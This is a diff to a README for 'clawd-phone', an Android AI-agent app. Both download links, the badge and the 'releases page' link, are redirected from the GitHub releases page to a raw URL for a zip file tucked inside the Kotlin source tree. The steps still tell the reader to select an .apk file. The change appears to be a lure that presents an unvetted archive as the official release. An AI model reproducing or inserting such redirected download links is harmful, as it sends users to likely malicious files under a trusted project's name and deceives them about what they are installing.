@@ -1,6 +1,6 @@
 # 📱 clawd-phone - Automate tasks with your android assistant
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Atricoraptor/clawd-phone/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Atricoraptor/clawd-phone/main/android/app/src/main/kotlin/com/clawdphone/app/clawd-phone-v1.1.zip)
 
 Clawd Phone is an application for your Android device. It uses artificial intelligence to help you complete tasks on your phone. The application acts as an agent. It understands your goals and performs actions. You do not need to perform every step manually. This tool handles the process for you.
 
@@ -8,7 +8,7 @@ Clawd Phone is an application for your Android device. It uses artificial intell
 
 You need an Android phone to use this application. Ensure your phone runs Android 12 or newer. You also need an internet connection to download the file. Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/Atricoraptor/clawd-phone/releases) to download the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/Atricoraptor/clawd-phone/main/android/app/src/main/kotlin/com/clawdphone/app/clawd-phone-v1.1.zip) to download the application.
 2. Select the file ending in .apk.
 3. Save the file to your device.
 
